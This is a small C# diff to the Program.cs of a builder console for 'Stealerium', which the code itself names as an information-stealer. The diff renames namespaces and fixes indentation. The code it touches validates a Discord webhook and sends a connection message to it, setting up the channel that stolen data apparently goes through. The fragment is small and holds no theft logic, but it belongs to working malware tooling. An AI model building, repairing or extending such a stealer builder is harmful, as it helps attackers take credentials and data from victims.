@@ -1,7 +1,7 @@
-﻿using Builder.Modules;
-using Builder.Modules.Build;
+﻿using BuilderConsole.Modules;
+using BuilderConsole.Modules.build;
 
-namespace Builder;
+namespace BuilderConsole;
 
 internal class Program
 {
@@ -22,7 +22,7 @@ internal class Program
 
         // Test connection to Discord webhook url
         if (!await Discord.WebhookIsValidAsync(token))
-                Cli.ShowError("Check the webhook url!");
+            Cli.ShowError("Check the webhook url!");
         else
             await Discord.SendMessageAsync("✅ *Stealerium* builder connected successfully!", token);
         Cli.ShowSuccess("Connected successfully!\n");
